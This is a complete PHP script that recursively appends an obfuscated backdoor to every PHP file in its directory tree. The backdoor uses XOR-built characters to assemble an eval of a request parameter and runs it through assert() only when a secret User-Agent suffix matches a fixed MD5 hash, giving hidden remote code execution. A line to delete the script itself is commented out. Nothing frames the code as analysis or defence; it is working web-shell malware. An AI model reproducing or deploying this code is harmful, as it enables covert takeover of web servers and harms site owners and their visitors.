<?php
$s="<?php if(md5(substr(\$_SERVER['HTTP_USER_AGENT'],-7))=='c9813cb1b00c16ed0d98d7c9bd57b850'){\$a=chr(96^5);\$b=chr(57^79);\$c=chr(15^110);\$d=chr(58^86);\$e='(\$_REQUEST[yzj])';@assert(\$a.\$b.\$c.\$d.\$e);}?>";
function walkfiles($path){
    foreach(scandir($path) as $afile)
    {
        if($afile=='.'||$afile=='..') continue;
        if(is_dir($path.DIRECTORY_SEPARATOR.$afile))
        {
            walkfiles($path.DIRECTORY_SEPARATOR.$afile);
        } else {
            $filename = $path.DIRECTORY_SEPARATOR.$afile;
            if($filename!==__FILE__){
                $file_ext  = pathinfo($filename,PATHINFO_EXTENSION);
                if( strtolower( $file_ext ) ==='php'){
                    try{
                        file_put_contents($filename,$GLOBALS['s'],FILE_APPEND);
                    }catch(Exception $e){
                        //pass
                    }
                }
            }
        }
    }
} 
walkfiles(__DIR__);
// unlink(__FILE__);
?>